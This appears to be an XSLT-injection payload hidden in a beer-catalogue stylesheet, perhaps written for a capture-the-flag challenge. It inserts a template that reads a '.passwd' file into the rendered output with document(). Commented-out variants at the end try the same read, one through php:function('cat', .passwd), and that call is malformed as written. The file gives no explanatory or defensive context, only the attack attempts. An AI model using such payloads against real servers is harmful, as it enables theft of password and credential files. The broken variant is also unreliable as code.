<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">

<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
  <xsl:template match="/">
  <xsl:copy-of select="document('.passwd')"/>
  </xsl:template>
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <xsl:value-of select="price"/>
    </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
    <p>
    <xsl:value-of select="description"/>
    <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
    </p>
    </div>
</xsl:for-each>
</body>
</html>



<!-- <xsl:template match=”/”>
<xsl:copy-of select=”document(‘.passwd’)”/>
</xsl:template>
</xsl:stylesheet> -->
<!-- <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" exclude-result-prefixes="php">

    <xsl:output method="html" encoding="iso-8859-1" indent="no"/>

    <xsl:template match="/">
        <ul>
            <xsl:apply-templates />
        </ul>
    </xsl:template>

    <xsl:template match="utilisateur">
        <li><xsl:value-of select="php:function('cat', .passwd)" /></li>
    </xsl:template>

</xsl:stylesheet> -->
